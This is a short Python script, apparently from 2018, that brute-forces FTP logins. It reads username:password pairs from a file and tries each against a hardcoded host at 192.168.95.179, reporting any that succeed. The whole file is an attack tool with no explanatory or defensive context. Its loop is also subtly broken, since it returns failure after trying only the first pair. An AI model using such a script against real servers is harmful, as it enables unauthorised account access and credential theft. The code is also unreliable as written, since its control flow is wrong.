#！/usr/bin/env python
# _*_ coding:utf-8 _*_

'''

@author: yerik

@contact: xiangzz159@qq.com

@time: 2018/6/13 9:47

@desc: 暴力破解FTP

'''

import ftplib

def bruteLogin(hostname, passwordFile):
    pF = open(passwordFile)
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + username + '/' + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print('\n[*] ' + str(hostname) + ' FTP Logon Successed: ' + username + '/' + password)
            ftp.quit()
            return (username, password)
        except Exception as e:
            pass
        print('\n[-] Could not brute borce FTP creadentials.')
        return (None, None)

host = '192.168.95.179'
passwordFile = 'D:\userpass.txt'
bruteLogin(host, passwordFile)
